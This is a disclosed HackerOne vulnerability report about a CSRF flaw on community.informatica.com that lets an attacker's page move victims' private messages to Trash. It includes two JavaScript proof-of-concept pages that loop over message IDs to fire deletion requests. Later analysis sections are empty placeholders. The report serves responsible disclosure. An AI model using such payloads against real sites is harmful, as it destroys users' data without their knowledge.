---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '45050'
original_report_id: '45050'
title: '[community.informatica.com] - CSRF in Private Messages allows to move user''s
  messages to Trash'
weakness: Cross-Site Request Forgery (CSRF)
team_handle: informatica
created_at: '2015-01-24T16:36:08.506Z'
disclosed_at: '2016-03-02T02:46:07.403Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# [community.informatica.com] - CSRF in Private Messages allows to move user's messages to Trash

## Metadata

- HackerOne Report ID: 45050
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: informatica
- Disclosed At: 2016-03-02T02:46:07.403Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello,

https://community.informatica.com/pm-delete.jspa doesn't check Referrer header or CSRF token when you move a message to Trash. As a result, an attacker can implement CSRF attack, and make a victim move messages to Trash. Then, according to the message on Trash page (https://community.informatica.com/pm.jspa?folderID=4), Trash is emptied daily. So a victim can lose messages.

To remove a message, an attacker needs to know a message ID. Message IDs seem to be global, so an attacker can do the following:
- guess the current max message ID (for example, an attacker can send a message to yourself, and use this message ID)
- try to remove N messages with IDs that belong to an interval [max_message_id - N, max_message_id]

For example, a script like the following may be placed on attacker's page:

<html>
 <body>
  <div id="delete"></div>
  <script>
   var start_message_id = 16000;
   var message_count = 100;
   var text = "";
   var message_id = start_message_id;
   for (i = 0; i < message_count; i++) {
     text += "<img src=\"https://community.informatica.com/pm-delete.jspa?1&messageID=" + message_id + "\"\/>";
     message_id++;
   }
   document.getElementById("delete").innerHTML = text;
  </script>
 </body>
</html>

When a victim loads the page above, the script will remove messages with IDs from 16000 to 16100. The script above sends a GET request for each possible message. As a result, it works quite slow. So it might be hard to remove all users messages because a victim should stay on the page before the script is finished.

I tried to modify the script above to send a request for a batch of messages:

<script>
   var start_message_id = 15900;
   var message_count = 200;
   var N = 1;
   var text = "<img src=\"https://community.informatica.com/pm-delete.jspa?1";
   var message_id = start_message_id;
   for (i = 0; i < message_count; i++) {
     text += "&messageID=" + message_id;
     if (i != 0 && i % N == 0) {
       text += "\"\/>";
       document.getElementById("delete").innerHTML += text;
       text = "<img src=\"https://community.informatica.com/pm-delete.jspa?1";
     }
     message_id++;
   }
  </script>

But it doesn't seem to work fine. Seems the application stops removing if it finds not existing message ID.

Anyway, it can damage user's data a lot. Please take a look.

Artem

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
